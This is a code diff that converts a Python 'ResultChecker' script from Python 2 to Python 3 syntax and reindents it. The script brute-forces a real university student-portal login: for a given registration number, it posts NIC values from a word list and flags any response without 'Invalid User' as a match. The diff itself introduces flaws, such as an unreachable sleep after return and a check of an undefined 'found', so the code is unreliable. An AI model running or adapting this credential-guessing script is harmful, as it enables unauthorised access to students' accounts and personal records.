@@ -20,28 +20,25 @@ class ResultChecker:
         self.regNumber = rNumber
 
     def setDetails(self):
-        r = raw_input("Registration number >> ")
+        r = input("Registration number >> ")
         self.setRegNumber(r)
 
     def initiate(self, n):
-		if(found == 0):
-			count = 0
-			proc = self.processList[n]
-			fullCount = len(proc)
-			status = 1
-			target_url = "http://student.sliit.lk/profile/index.php"
-			data_dict = {"regno": self.regNumber,
-						 "nic": "",
-						 "submit": "submit"}
-			for word in proc:
-				data_dict["nic"] = word
-
-				response = requests.post(target_url, data=data_dict)
-				if "Invalid User" not in response.content:
-					print("[+] Found a match --> " + word)
-					self.found = 1
-				else:
-					status = 0
-		else:
-			return
-		time.sleep(1)
+        if(found == 0):
+            count = 0
+            proc = self.processList[n]
+            fullCount = len(proc)
+            status = 1
+            target_url = "http://student.sliit.lk/profile/index.php"
+            data_dict = {"regno": self.regNumber,"nic": "","submit": "submit"}
+            for word in proc:
+                data_dict["nic"] = word
+                response = requests.post(target_url, data=data_dict)
+                if "Invalid User" not in response.content:
+                    print("[+] Found a match --> " + word)
+                    self.found = 1
+                else:
+                    status = 0
+        else:
+            return
+            time.sleep(1)
